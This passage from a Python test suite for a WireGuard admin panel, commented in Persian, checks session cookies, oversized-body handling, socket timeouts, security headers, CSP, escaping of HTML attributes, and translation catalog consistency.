        این تست همان چیزی است که مرورگرِ کاربر می‌بیند.
        """
        c = self._conn()
        try:
            for i in range(3):
                c.request("GET", "/tv3d.mjs")
                r = c.getresponse()
                r.read()
                self.assertEqual(r.status, 200, "درخواستِ %d شکست" % (i + 1))
        finally:
            c.close()

    def test_session_cookie_round_trips(self):
        """کوکیِ نشست باید ست شود، برگردد، و پذیرفته شود.

        هارنسِ ۰۱۹ ‏`_session` را جعل می‌کند، پس هرگز ثابت نمی‌کند که
        کوکیِ واقعی امضا، برگردانده و تأیید می‌شود.
        """
        m = self.m
        pw = "pw-for-test-only"
        m.CONFIG["users"] = [{"username": "admin", "salt": "", "hash": "",
                              "role": "admin", "totp": "", "protected": True,
                              "active": True}]
        # از همان مسیری که خودِ پنل می‌سازد، نه با هشِ دستی
        m.set_user_password(m.CONFIG["users"][0], pw)
        c = self._conn()
        c.request("POST", "/api/login",
                  body=json.dumps({"username": "admin", "password": pw}),
                  headers={"Content-Type": "application/json"})
        r = c.getresponse()
        raw = r.read()
        cookie = r.getheader("Set-Cookie")
        status = r.status
        c.close()
        if status != 200:
            # ۲مرحله‌ای یا فهرستِ IP می‌تواند ورود را چندمرحله‌ای کند؛
            # skip با پاسخِ واقعی بسیار مفیدتر از شکستی است که شبیهِ
            # رگرسیون به‌نظر می‌رسد.
            self.skipTest("ورود در این پیکربندی ۲۰۰ نداد: %s %s"
                          % (status, raw[:200]))
        self.assertTrue(cookie, "Set-Cookie فرستاده نشد")
        for flag in ("HttpOnly", "SameSite=Strict"):
            self.assertIn(flag, cookie, "کوکیِ نشست %s ندارد" % flag)
        c2 = self._conn()
        c2.request("GET", "/api/stats",
                   headers={"Cookie": cookie.split(";")[0]})
        r2 = c2.getresponse()
        r2.read()
        c2.close()
        self.assertEqual(r2.status, 200, "کوکیِ برگردانده‌شده پذیرفته نشد")

    def test_panel_page_is_served(self):
        """صفحه از سرِ تا ته سرو می‌شود — نه فقط رندر می‌شود."""
        c = self._conn()
        c.request("GET", "/")
        r = c.getresponse()
        body = r.read()
        c.close()
        # اینکه درخواستِ بی‌احراز صفحه بگیرد یا ۳۰۲ یا ۴۰۱، تصمیمِ
        # مسیریابی است و این پلن آن را پین نمی‌کند. مهم: سرور پاسخ می‌دهد.
        self.assertIn(r.status, (200, 302, 401))
        if r.status == 200:
            self.assertIn(b"<html", body[:2000].lower())
            self.assertGreater(len(body), 10000, "صفحه مشکوکانه کوچک است")

    # ── بدنه‌ی بیش‌ازحد بزرگ (پلنِ ۰۳۸) ────────────────────────────────
    # این باگ دربارهٔ **وضعیتِ اتصال** است، پس تستِ بی‌سوکت نمی‌بیندش.
    # protocol_version روی HTTP/1.1 است ⇒ اتصال keep-alive می‌ماند ⇒
    # این باگِ زنده بود، نه سخت‌سازیِ آینده‌نگر.

    def test_connection_survives_an_oversized_json_body(self):
        """بدنه‌ی بزرگ نباید اتصال را ناهم‌گام کند.

        پیش از این بدنه اصلاً خوانده نمی‌شد: بایت‌ها در بافر می‌ماندند و
        درخواستِ بعدیِ همان اتصال آن‌ها را به‌عنوانِ خطِ درخواست می‌خواند.
        درخواستِ **دومِ روی همان اتصال** کلِ این تست است؛ بدونش فقط یک
        کدِ وضعیت سنجیده می‌شود، که هرگز باگ نبود.
        """
        c = self._conn()
        try:
            c.request("POST", "/api/login", body=b"x" * (70 * 1024),
                      headers={"Content-Type": "application/json"})
            r = c.getresponse()
            r.read()
            self.assertEqual(r.status, 413, "بدنه‌ی بزرگ ۴۱۳ نگرفت")
            c.request("GET", "/tv3d.mjs")
            r2 = c.getresponse()
            r2.read()
            self.assertEqual(r2.status, 200,
                             "اتصال بعد از بدنه‌ی بزرگ ناهم‌گام شد")
        finally:
            c.close()

    def test_oversized_body_is_distinguishable_from_bad_json(self):
        """۴۱۳ برای «بزرگ»، ۴۰۰ برای «JSON خراب».

        پیش از این هر دو None برمی‌گرداندند و کاربر یک پاسخِ عمومی
        می‌گرفت برای مشکلی که کاملاً قابلِ رفع بود.
        """
        c = self._conn()
        try:
            c.request("POST", "/api/login", body=b"{not json",
                      headers={"Content-Type": "application/json"})
            r = c.getresponse()
            r.read()
            self.assertEqual(r.status, 400, "JSON ِ خراب ۴۰۰ نگرفت")
        finally:
            c.close()

    def _login(self, pw="pw-for-test-only"):
        """وارد می‌شود و کوکیِ نشست را برمی‌گرداند — یا skip.

        مسیرهایی مثل /api/restore پشتِ احراز هویت‌اند؛ بدونِ نشستِ
        واقعی، تست به شاخه‌ی موردِ نظر **نمی‌رسد** و سبزی‌اش هیچ
        نمی‌گوید.
        """
        m = self.m
        m.CONFIG["users"] = [{"username": "admin", "salt": "", "hash": "",
                              "role": "admin", "totp": "", "protected": True,
                              "active": True}]
        m.set_user_password(m.CONFIG["users"][0], pw)
        c = self._conn()
        c.request("POST", "/api/login",
                  body=json.dumps({"username": "admin", "password": pw}),
                  headers={"Content-Type": "application/json"})
        r = c.getresponse()
        raw = r.read()
        cookie = r.getheader("Set-Cookie")
        status = r.status
        c.close()
        if status != 200 or not cookie:
            self.skipTest("ورود ۲۰۰ نداد: %s %s" % (status, raw[:160]))
        return cookie.split(";")[0]

    def test_oversized_restore_closes_the_connection_cleanly(self):
        """بدنه‌ی خیلی بزرگ باید اتصال را **تمیز** ببندد، نه ناهم‌گام رها کند.

        ۵۰MB برای تخلیه زیادی است؛ راهِ درست بستن است. تمیز یعنی پاسخِ
        کاملِ ۴۱۳ برسد، هدرِ Connection: close همراهش باشد، و ۶۰MB بدنه
        هرگز خوانده نشود.

        با نشستِ واقعی اجرا می‌شود: بدونِ آن، گاردِ احراز هویت زودتر
        رد می‌کند و تست هرگز به شاخه‌ی اندازه نمی‌رسد.
        """
        pw = "pw-for-test-only"
        cookie = self._login(pw)
        c = self._conn()
        try:
            c.putrequest("POST", "/api/restore", skip_accept_encoding=True)
            c.putheader("Content-Length", str(60 * 1024 * 1024))
            c.putheader("X-Confirm-Password", pw)
            c.putheader("Cookie", cookie)
            c.endheaders()                       # بدنه عمداً فرستاده نمی‌شود
            r = c.getresponse()
            r.read()
            self.assertEqual(r.status, 413, "بدنه‌ی ۶۰MB ۴۱۳ نگرفت")
            self.assertEqual((r.getheader("Connection") or "").lower(), "close",
                             "اتصال برای بستن علامت نخورد")
        finally:
            c.close()

    def test_plain_http_connections_get_a_socket_timeout(self):
        """در حالتِ HTTP ِ ساده هم باید تایم‌اوتِ سوکت ست شود.

        کلاسِ TLSThreadingHTTPServer دقیقاً برای همین ساخته شد — داکِ
        خودش یک قطعیِ اندازه‌گیری‌شده را ثبت می‌کند — ولی **هر دو**
        settimeout پشتِ شرطِ TLS بودند. حالتِ ساده پیش‌فرضِ بسته‌های
        docker و airgap است.

        تستِ واقعی است نه متنی: سوکت باز می‌شود و هیچ بایتی نمی‌فرستد.
        session_timeout روی همین نمونه به ۱ ثانیه پایین آورده می‌شود —
        سوئیت نباید ۳۰۰ ثانیه صبر کند.
        """
        import socket
        self.srv.session_timeout = 1.0
        sk = socket.create_connection(("127.0.0.1", self.port), timeout=10)
        try:
            sk.settimeout(10)
            t0 = time.time()
            data = sk.recv(1)          # سرور باید ببندد، نه اینکه بماند
            waited = time.time() - t0
        finally:
            sk.close()
        self.assertEqual(data, b"", "اتصالِ ساکت بسته نشد")
        self.assertLess(waited, 8, "بستن خیلی طول کشید: %.1fs" % waited)

    def test_security_headers_present(self):
        """هدرهای امنیتی روی پاسخِ واقعی — نه فقط در کد."""
        c = self._conn()
        c.request("GET", "/")
        r = c.getresponse()
        r.read()
        c.close()
        self.assertEqual(r.getheader("X-Content-Type-Options"), "nosniff")
        self.assertEqual(r.getheader("X-Frame-Options"), "DENY")
        self.assertEqual(r.getheader("Referrer-Policy"), "no-referrer")

    def test_csp_allows_embedded_data_fonts(self):
        """فونتِ وزیرمتن data: است؛ CSP باید font-src ِ data: را مجاز کند.

        بدونِ font-src مرورگر به default-src 'self' می‌افتاد و فونتِ
        جاسازی‌شده بی‌صدا رد می‌شد — صفحه با فونتِ سیستم نمایش داده می‌شد.
        """
        c = self._conn()
        c.request("GET", "/")
        r = c.getresponse()
        r.read()
        c.close()
        csp = r.getheader("Content-Security-Policy") or ""
        directives = {d.split()[0]: d.split()[1:]
                      for d in (x.strip() for x in csp.split(";")) if d}
        self.assertIn("font-src", directives, csp)
        self.assertIn("data:", directives["font-src"], csp)
        self.assertIn("url(data:font/woff2", self.m.render_page("fa"))


class InlineJsCatalogParityTests(unittest.TestCase):
    """توازنِ کلیدهای _t ِ سمتِ JS با کاتالوگِ سمتِ پایتون.

    `_t` عمداً کلیدِ گم‌شده را خودش برمی‌گرداند («کلیدِ گم‌شده پیدا
    باشد»)، پس کلیدِ اشتباه نه استثنا می‌دهد نه صفحه را می‌شکند — فقط
    «ui.role.admin» را جای «مدیر» روی صفحه چاپ می‌کند. همان خانواده‌ای
    که باگِ roleLabel از آن آمد. ~۱٬۰۲۰ فراخوانی هست و هیچ‌کدام
    وارسی نمی‌شد.

    کاتالوگ در پایتون است و فراخوانی در JS، پس گارد اینجاست نه در
    tests/js/.
    """

    # استخراج‌کننده در .claude/ است و آن پوشه لایه‌ی عملیاتی است و در
    # شاخه‌ی public منتشر نمی‌شود — همان الگوی AnsibleSyncTests و
    # QrAssetTests. اینجا هرگز skip نمی‌شود.
    EXTRACTOR = ROOT / ".claude/skills/verify-battery/extract-inline-js.py"

    @classmethod
    def setUpClass(cls):
        import subprocess
        if not cls.EXTRACTOR.exists():
            raise unittest.SkipTest("استخراج‌کننده‌ی JS نیست — مخزنِ عمومی")
        cls.tmpdir = tempfile.mkdtemp(prefix="wgjs-parity-")
        subprocess.run(
            ["python3", str(cls.EXTRACTOR), str(ROOT / "wg_panel.py"),
             cls.tmpdir],
            check=True, capture_output=True)
        cls.js = "".join(
            (pathlib.Path(cls.tmpdir) / f).read_text(encoding="utf-8")
            for f in sorted(os.listdir(cls.tmpdir)))

    @classmethod
    def tearDownClass(cls):
        # getattr چون وقتی setUpClass با SkipTest بیرون می‌آید، tmpdir
        # اصلاً ساخته نشده است
        shutil.rmtree(getattr(cls, "tmpdir", ""), ignore_errors=True)

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-parity-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_every_literal_t_key_exists_in_the_catalog(self):
        """هر کلیدِ **ثابتی** که JS با _t صدا می‌زند باید در کاتالوگ باشد.

        بسته‌شدن با `)` یا `,` لازم است: رشته‌ای که با `+` ادامه پیدا
        می‌کند کلیدِ کامل نیست بلکه پیشوندِ یک کلیدِ ساخته‌شده است
        (`_t('ui.role.' + code)`). بدونِ این قید، دو پیشوند به‌عنوانِ
        «کلیدِ گم‌شده» گزارشِ کاذب می‌دادند.
        """
        keys = set(re.findall(r"""_t\(\s*['"]([\w.]+)['"]\s*[,)]""", self.js))
        self.assertGreater(len(keys), 500,
                           "فقط %d کلید پیدا شد — الگو با سورس نمی‌خواند؟"
                           % len(keys))
        missing = sorted(keys - set(self.m.I18N))
        self.assertEqual(missing, [],
                         "کلیدهای گم‌شده در کاتالوگ: %s" % missing)

    def test_dynamic_t_keys_have_a_known_prefix(self):
        """کلیدِ ساخته‌شده در زمانِ اجرا باید پیشوندی داشته باشد که
        دستِ‌کم یک کلیدِ واقعی با آن شروع شود.

        ⚠️ محدودیتِ صریح: این گارد خانواده را **باریک می‌کند، نه
        می‌بندد**. باگِ roleLabel دقیقاً `_t('ui.role.' + code)` بود با
        code='admin'؛ چون `ui.role.*` وجود دارد، همین گارد از کنارش
        رد می‌شد. پوششِ کامل اجرای پنل با DOM لازم دارد.
        """
        prefixes = set(re.findall(
            r"""_t\(\s*['"]([\w.]+\.)['"]\s*\+""", self.js))
        cat = set(self.m.I18N)
        for p in sorted(prefixes):
            with self.subTest(prefix=p):
                self.assertTrue(any(k.startswith(p) for k in cat),
                                "هیچ کلیدی با پیشوندِ %r نیست" % p)


class AttributeSinkTests(unittest.TestCase):
    """مقدارِ داخلِ صفتِ HTML به گریزِ **صفت** نیاز دارد، نه گریزِ رشته‌ی JS."""

    def test_no_value_reaches_an_onclick_attribute_through_a_quote_only_escape(self):
        """هیچ مقداری نباید با «فقط \' را عوض کن» داخلِ صفتِ onclick برود.

        صفت با " محدود شده، پس جایگزینیِ تک‌نقل‌قول به‌تنهایی " را
        دست‌نخورده رد می‌کرد: کلیدِ گراف از location.hash می‌آمد،
        saveGraphState آن را در localStorage ماندگار می‌کرد، و هر
        رندرِ بعدی دوباره تزریقش می‌کرد. با unsafe-inline در CSP،
        صفتِ تزریق‌شده اجرا می‌شود.

        ‏`replace(/'/g, "\\'")` مسئله‌ی رشته‌ی JS را در بسترِ صفتِ HTML
        حل می‌کند — لایه‌ی اشتباه. الگو باید esc(...) را پیش از خودش
        داشته باشد.
        """
        src = _read_panel_source()
        # کامنت‌ها را بردار — گاردِ متنی نباید کامنتی را که همین تله را
        # توضیح می‌دهد به‌جای کد بگیرد (دو بار در این مخزن رخ داده)
        body = "\n".join(l for l in src.splitlines()
                          if not l.lstrip().startswith(("//", "#")))
        bad = [(body[:mo.start()].count("\n") + 1, mo.group(0)[:70])
               for mo in re.finditer(r"replace\(/'/g,\s*[\"\']\\\\'", body)
               if "esc(" not in body[max(0, mo.start() - 60):mo.start()]]
        self.assertEqual(bad, [], "گریزِ ناقص پیش از صفتِ onclick: %s" % bad)

    def test_graph_key_from_the_url_is_validated_by_shape(self):
        """کلیدِ گراف باید با قالب سنجیده شود، نه فقط با typeof.

        هر دو ورودی: hash و localStorage. اعتبارسنجیِ تنهای hash،
        پیلودی را که پیش از این رفع ماندگار شده زنده رها می‌کند.
        """
        src = _read_panel_source()
        self.assertTrue("GKEY_RE" in src, "الگوی اعتبارسنجیِ کلیدِ گراف نیست")
        for fn in ("applyGraphHash", "loadGraphState"):
            seg = src[src.index("function %s" % fn):][:900]
            with self.subTest(fn=fn):
                self.assertIn("GKEY_RE", seg,
                              "%s کلید را اعتبارسنجی نمی‌کند" % fn)


class SilentClientFailureTests(unittest.TestCase):
    """سه شکستی که صفحه را «سالم به‌نظر» نگه می‌داشتند.

    داشبوردی که عددِ کهنه نشان می‌دهد از پیامِ خطا بدتر است، چون
    اپراتور از رویش تصمیم می‌گیرد.
    """

    def test_busy_flag_is_released_in_a_finally(self):
        """هر جا busy=true می‌شود، آزادشدنش باید در finally باشد.

        بیرونِ finally، یک استثنا در خودِ catch پرچم را قفل می‌کند و از
        آن پس renderUsers/renderTunnels/renderIfaces/drawOpenGraphs هرگز
        صدا نمی‌شوند — صفحه زنده به نظر می‌رسد و داده‌ی کهنه نشان می‌دهد.
        """
        src = _read_panel_source()
        lines = src.splitlines()
        sites = [mo.start() for mo in re.finditer(r"\bbusy\s*=\s*true", src)]
        self.assertTrue(sites, "هیچ busy=true پیدا نشد — ساختار عوض شده؟")
        for off in sites:
            ln = src[:off].count("\n") + 1
            seg = "\n".join(lines[ln - 1:ln + 30])
            with self.subTest(line=ln):
                self.assertRegex(
                    seg, r"finally\s*\{[^}]*busy\s*=\s*false",
                    "busy در خط %d بیرونِ finally آزاد می‌شود" % ln)

    def test_object_urls_are_not_revoked_synchronously(self):
        """revokeObjectURL نباید بلافاصله بعد از click بیاید.

        دانلود ممکن است هنوز بلاب را نخوانده باشد؛ در چند مرورگر همین
        لغوش می‌کند — و روی صفحه‌ی اشتراک، که کاربرِ نهایی با مرورگرِ
        خودش می‌بیند، هیچ کنسولی هم نیست که کسی نگاه کند.
        """
        src = _read_panel_source()
        body = "\n".join(l for l in src.splitlines()
                          if not l.lstrip().startswith(("//", "#")))
        self.assertNotRegex(
            body, r"\.click\(\);\s*URL\.revokeObjectURL",
            "revokeObjectURL هم‌زمان بعد از click")

    def test_download_anchors_are_attached_to_the_document(self):
        """لنگرِ دانلود باید پیش از click در سند باشد.

        فایرفاکس تاریخاً click() روی المانِ جدا از سند را نادیده
        می‌گیرد — شکستی کاملاً بی‌صدا.
        """
        src = _read_panel_source()
        body = "\n".join(l for l in src.splitlines()
                          if not l.lstrip().startswith(("//", "#")))
        n_click = len(re.findall(r"\ba\.click\(\)", body))
        n_attach = len(re.findall(r"appendChild\(a\)", body))
        self.assertEqual(
            n_click, n_attach,
            "%d فراخوانیِ a.click ولی %d بار appendChild(a)"
            % (n_click, n_attach))

    def test_stats_poll_surfaces_failure(self):
        """شکستِ نظرسنجیِ آمار نباید بی‌صدا برگردد."""
        src = _read_panel_source()
        seg = src[src.index("async function refresh("):][:1400]
        self.assertNotRegex(
            seg, r"catch\s*\(\s*\w*\s*\)\s*\{\s*return;?\s*\}",
            "شکستِ /api/stats بی‌صدا بلعیده می‌شود")
        self.assertIn("markStale", seg, "نشانگرِ کهنگی صدا زده نمی‌شود")


class DisplayLocaleTests(unittest.TestCase):
    """هیچ تاریخ/ساعتی نباید تقویمِ یک زبان را بر همه تحمیل کند."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-loc-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_no_hardcoded_display_locale(self):
        """لوکالِ ثابت در فرمتِ تاریخ/ساعت ممنوع.

        سه جا 'fa-IR' سخت‌کد بود، پس کاربرِ en/ru/zh ساعتِ هدر و برچسبِ
        گراف را با تقویمِ هجریِ شمسی می‌دید — سالِ ۱۴۰۵ به‌جای ۲۰۲۶.
        """
        src = _read_panel_source()
        body = "\n".join(l for l in src.splitlines()
                          if not l.lstrip().startswith(("//", "#")))
        bad = [(body[:mo.start()].count("\n") + 1, mo.group(0))
               for mo in re.finditer(
                   r"toLocale\w*String\(\s*['\"][a-z]{2}-[A-Z]{2}['\"]", body)]
        self.assertEqual(bad, [], "لوکالِ سخت‌کد در فرمتِ تاریخ/ساعت: %s" % bad)

    def test_locale_map_covers_every_language(self):
        """نگاشتِ لوکال باید با LANGS رشد کند و پیش‌فرضش فارسی نباشد.

        زبانِ پنجمِ بدونِ ورودی در نگاشت بی‌صدا en-GB می‌گیرد — که
        بدکِ قابلِ دفاعی است، ولی باید تصمیم باشد نه تصادف.
        """
        m = self.m
        src = _read_panel_source()
        seg = src[src.index("const _LOCALE"):][:400]
        for lang in m.LANGS:
            with self.subTest(lang=lang):
                self.assertRegex(seg, r"\b%s\s*:" % lang,
                                 "زبانِ %s در نگاشتِ لوکال نیست" % lang)
        fb = src[src.index("function uiLocale"):][:200]
        self.assertNotIn("fa-IR", fb,
                         "پیش‌فرضِ زبانِ ناشناخته نباید fa-IR باشد")

    def test_jalali_display_helpers_are_language_gated(self):
        """تبدیلِ جلالی در مسیرِ **نمایش** باید پشتِ _FA_ON باشد.

        fmtTs ‏(۱۷ فراخوانی: لاگِ ممیزی، WARP، بکاپ، اسپیدتست، هاورِ
        گراف) و faShamsi (ستونِ انقضا) بی‌قید شمسی می‌دادند. ویجتِ
        **ورودیِ** تاریخ عمداً بیرونِ این گارد است: انتخابگرِ تقویم
        دارد و کاربر خودش انتخاب می‌کند.
        """
        src = _read_panel_source()
        for fn in ("fmtTs", "faShamsi"):
            seg = src[src.index("function %s(" % fn):][:900]
            with self.subTest(fn=fn):
                self.assertIn("_FA_ON", seg,
                              "%s تقویم را به زبان گره نزده" % fn)


class CatalogContractTests(unittest.TestCase):
    """قراردادِ گریزِ کاتالوگ — پیشگیرانه، نه رفعِ باگ.

    کاتالوگ **امروز درست است**. ۱۹۳۶ کلید از سه مسیر با سه قراردادِ
    گریزِ متفاوت مصرف می‌شوند:

      ⟦key⟧ سرور، escape‌شده  ·  ⟪key⟫ سرور، خام  ·  _t() در JS، خام

    پس `<b>` در کلیدِ ⟪raw⟫ **لازم** است و در کلیدِ ⟦escaped⟧ روی صفحه
    به‌صورت &lt;b&gt; دیده می‌شود. اینکه یک کاراکتر امن است یا نه، کاملاً
    به این بستگی دارد که کلید با کدام نشانه مصرف شود — و تا امروز هیچ
    چیزی این جفت‌شدن را نگه نمی‌داشت. مترجم ردیف اضافه می‌کند و کسی
    این را مرور نمی‌کند.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-cat-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_no_key_with_markup_is_used_in_an_escaped_slot(self):
        """کلیدی که مارک‌آپ دارد نباید در جایگاهِ ⟦escaped⟧ برود.

        هر چهار زبان سنجیده می‌شوند، نه فقط فارسی: مترجمی که فقط به
        ستونِ چینی یک `<` اضافه کند دقیقاً همان شکستی است که این
        می‌گیرد.
        """
        src = _read_panel_source()
        esc_used = set(re.findall(r"⟦([\w.]+)⟧", src))
        self.assertGreater(len(esc_used), 50,
                           "فقط %d نشانه‌ی escaped — الگو با سورس نمی‌خواند؟"
                           % len(esc_used))
        bad = []
        for k in sorted(esc_used):
            row = self.m.I18N.get(k)
            if not row:
                continue                  # کلیدِ گم‌شده را تستِ بعدی می‌گیرد
            for lang, txt in zip(self.m.LANGS, row):
                if txt and re.search(r"[<>]", txt):
                    bad.append((k, lang, txt[:40]))
        self.assertEqual(bad, [],
                         "کلیدِ مارک‌آپ‌دار در جایگاهِ escaped: %s" % bad)

    def test_every_token_marker_names_a_real_key(self):
        """هر ⟦key⟧ و ⟪key⟫ باید کلیدی در کاتالوگ داشته باشد.

        گاردِ رندر (۰۲۱) نبودِ کلید را در **خروجی** می‌گیرد؛ این در
        **سورس** می‌گیردش و می‌گوید کدام خط را باید درست کرد.
        """
        # 🪤 کامنت‌ها بیرون می‌روند: خودِ سورس در چهار جا ⟦کلید⟧ و
        # ⟦ui.foo⟧ را به‌عنوانِ **مثال** توضیح می‌دهد. بدونِ این، گارد
        # چهار «نشانه‌ی بی‌مقصد»ِ کاذب گزارش می‌داد — همان دامی که این
        # مخزن دو بار خورده: گارد کامنتِ توضیح‌دهنده‌ی تله را می‌گیرد،
        # نه کد را.
        src = "\n".join(l for l in _read_panel_source().splitlines()
                         if not l.lstrip().startswith("#"))
        used = (set(re.findall(r"⟦([\w.]+)⟧", src))
                | set(re.findall(r"⟪([\w.]+)⟫", src)))
        self.assertGreater(len(used), 50, "مجموعه‌ی نشانه‌ها مشکوکانه کوچک است")
        missing = sorted(used - set(self.m.I18N))
        self.assertEqual(missing, [], "نشانه‌ی بی‌مقصد: %s" % missing)

    def test_keys_used_in_attributes_carry_no_quote_or_newline(self):
        """کلیدی که داخلِ صفتِ HTML می‌نشیند نباید " یا خطِ تازه داشته باشد.

        داخلِ title="…" یک نقلِ‌قول صفت را می‌بندد و خطِ تازه مارک‌آپ را
        می‌شکند. بیرونِ صفت هر دو بی‌ضررند — چند کلید عمداً خطِ تازه
        دارند چون پیامِ تلگرام‌اند.
        """
        src = _read_panel_source()
        attr = set(re.findall(
            r"""\b\w+="'\s*\+\s*_t\(\s*['"]([\w.]+)['"]""", src))
        attr |= set(re.findall(r"""\b\w+="⟦([\w.]+)⟧""", src))
        # گاردی که صفر مورد را می‌سنجد تا ابد سبز می‌ماند و شبیهِ پوشش
        # به‌نظر می‌رسد — رایج‌ترین راهِ بی‌ارزش‌شدنِ چنین تستی.
        self.assertGreater(len(attr), 20,
                           "فقط %d کلیدِ صفت‌نشین — الگو غلط است" % len(attr))
        bad = []
        for k in sorted(attr):
            row = self.m.I18N.get(k)
            if not row:
                continue
            for lang, txt in zip(self.m.LANGS, row):
                if txt and ('"' in txt or "\n" in txt):
                    bad.append((k, lang))
        self.assertEqual(bad, [], 'کلیدِ صفت‌نشین با " یا خطِ تازه: %s' % bad)

    def test_placeholder_names_are_supplied_at_python_call_sites(self):
        """جای‌گیرهای {p0} باید در فراخوانیِ A(...) واقعاً پاس شوند.

        جای‌گیرِ پاس‌نشده به‌صورت «{p0}» خام در پیامِ هشدار دیده می‌شود.
        """
        import ast
        src = _read_panel_source()
        ph = re.compile(r"\{(\w+)\}")
        checked, bad = 0, []
        for node in ast.walk(ast.parse(src)):
            if not isinstance(node, ast.Call):
                continue
            fn = node.func
            name = fn.id if isinstance(fn, ast.Name) else getattr(fn, "attr", "")
            if name != "A" or not node.args:
                continue
            first = node.args[0]
            if not (isinstance(first, ast.Constant)
                    and isinstance(first.value, str)):
                continue
            row = self.m.I18N.get(first.value)
            if not row:
                continue
            checked += 1
            want = set(ph.findall(row[0] or ""))
            got = {kw.arg for kw in node.keywords if kw.arg}
            if want - got:
                bad.append((node.lineno, first.value, sorted(want - got)))
        self.assertGreater(checked, 20,
                           "فقط %d فراخوانیِ A سنجیده شد" % checked)
        self.assertEqual(bad, [], "جای‌گیرِ پاس‌نشده: %s" % bad)


class ApiErrorLanguageTests(unittest.TestCase):
    """پاسخِ خطای API باید زبانِ درخواست را دنبال کند.

    رابط چهارزبانه شد ولی پیامِ خطای APIها فارسی ماند: کاربرِ انگلیسی
    رابطی کاملاً ترجمه‌شده می‌گرفت که هر شکست را فارسی جواب می‌داد —
    دقیقاً همان لحظه‌ای که گیر کرده و باید پیام را بخواند.
    """

    # 🪤 آستانه‌ی **نزولی**، نه صفر: تبدیل مرحله‌ای بود (پلنِ ۰۳۱ تیرِ A را
    # گرفت — ۱۵ رشته‌ی احراز هویت/مجوز/نرخ — و پلنِ ۰۶۵ بقیه را). این عدد
    # فقط اجازه دارد **کم** شود؛ بالابردنش رگرسیونی است که نشانِ سبز به تن
    # دارد. مسیر: ۱۰۰ (۱۳ اوت) → ۸۴ → ۸۳ → **۰** (۱۴ اوت ۲۰۲۶).
    #
    # صفر شد، ولی گارد **می‌ماند**: کاری که از این پس می‌کند جلوگیری از
    # نوشتنِ پیامِ فارسیِ تازه است، نه شمردنِ بدهیِ قدیمی.
    REMAINING_RAW_ERRORS = 0

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-apierr-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_permission_error_follows_the_request_language(self):
        """پیامِ «مجوز نداری» باید به زبانِ درخواست بیاید."""
        m = self.m
        m.CONFIG["users"] = [{"username": "viewer", "salt": "a" * 32,
                              "hash": "h", "role": "viewer", "totp": "",
                              "active": True}]
        want = {"fa": "مجوز", "en": "permission", "ru": "прав", "zh": "权限"}
        for lang, needle in want.items():
            with self.subTest(lang=lang):
                h = make_fake_handler(
                    m, path="/api/peer/delete", method="POST",
                    headers={"Cookie": "wgl=%s" % lang},
                    session={"u": "viewer", "r": "viewer"})
                self.assertTrue(h._perm_denied("/api/peer/delete"),
                                "گیت اصلاً رد نکرد")
                body = b"".join(h.body).decode("utf-8")
                self.assertIn(needle, body.lower() if lang == "en" else body,
                              "پاسخ به زبانِ %s نیامد: %s" % (lang, body[:120]))

    def test_converted_keys_exist_in_all_four_languages(self):
        """کلیدهای تیرِ A باید هر چهار ستون را داشته باشند و ماشینی نباشند."""
        m = self.m
        keys = [k for k in m.I18N if k.startswith("api.err.auth.")]
        self.assertGreaterEqual(len(keys), 15,
                                "فقط %d کلیدِ auth — تبدیل ناقص است" % len(keys))
        for k in keys:
            row = m.I18N[k]
            with self.subTest(key=k):
                self.assertEqual(len(row), len(m.LANGS))
                for lang, txt in zip(m.LANGS, row):
                    self.assertTrue(txt and txt.strip(),
                                    "ستونِ %s خالی است" % lang)
                # ستونِ غیرفارسی نباید فارسی مانده باشد
                for lang, txt in list(zip(m.LANGS, row))[1:]:
                    self.assertNotRegex(txt, r"[؀-ۿ]",
                                        "ستونِ %s هنوز فارسی است" % lang)

    def test_raw_persian_error_count_only_decreases(self):
        """شمارِ خطاهای فارسیِ خام فقط حق دارد کم شود.

        قالبِ صادقِ یک مهاجرتِ مرحله‌ای همین است: رگرسیون را فوراً
        می‌بندد و پیشرفت را ثبت می‌کند. بالابردنِ این عدد یعنی عقب‌گرد.
        """
        src = _read_panel_source()
        raw = re.findall(r'"error":\s*"([^"]*[؀-ۿ][^"]*)"', src)
        self.assertLessEqual(
            len(raw), self.REMAINING_RAW_ERRORS,
            "خطای فارسیِ خام از آستانه بیشتر شد: %d > %d"
            % (len(raw), self.REMAINING_RAW_ERRORS))

    def test_no_persian_reaches_error_in_any_shape(self):
        """الگوی بالا فقط رشته‌ی **بلافاصله بعدِ** `"error":` را می‌بیند.

        نقطه‌ی کورش حینِ اجرای پلنِ ۰۶۵ پیدا شد و دو پیامِ واقعیِ کاربر
        در آن پنهان بودند:

            "error": None if n else "یافت نشد"
            "error": (err or "traceroute پاسخی نداد").strip()[:200]

        هیچ‌کدام در شمارشِ ۸۳تایی نبودند، چون بعد از دونقطه پرانتز یا
        `None` می‌آید نه گیومه. یعنی شمارنده‌ی «بدهی» خودش کم‌برآورد
        می‌کرد. این گارد هر فارسی‌ای را در **هر شکلی** از مقدارِ `error`
        می‌گیرد.
        """
        src = _read_panel_source()
        bad = re.findall(r'"error":[^,}\n]*[؀-ۿ][^,}\n]*', src)
        self.assertEqual(bad, [], "پیامِ فارسی در مقدارِ error: %s" % bad)

    def test_no_persian_reaches_message_in_any_shape(self):
        """همتای گاردِ بالا برای خانهٔ `message` (پیامِ موفقیت در toast).

        `/api/report/test` تا این‌جا «در حالِ ساخت و ارسال…» ِ فارسیِ ثابت
        برمی‌گرداند و کاربرِ en/ru/zh همان را در toast می‌دید؛ گاردِ `error`
        آن را نمی‌دید چون خانه‌اش `message` بود.
        """
        src = _read_panel_source()
        bad = re.findall(r'"message":[^,}\n]*[؀-ۿ][^,}\n]*', src)
        self.assertEqual(bad, [], "پیامِ فارسی در مقدارِ message: %s" % bad)

    def test_report_test_message_follows_the_request_language(self):
        m = self.m
        m.CONFIG["users"] = [{"username": "admin", "salt": "a" * 32,
                              "hash": "h", "role": "admin", "totp": "T" * 16,
                              "stoken": "s1"}]
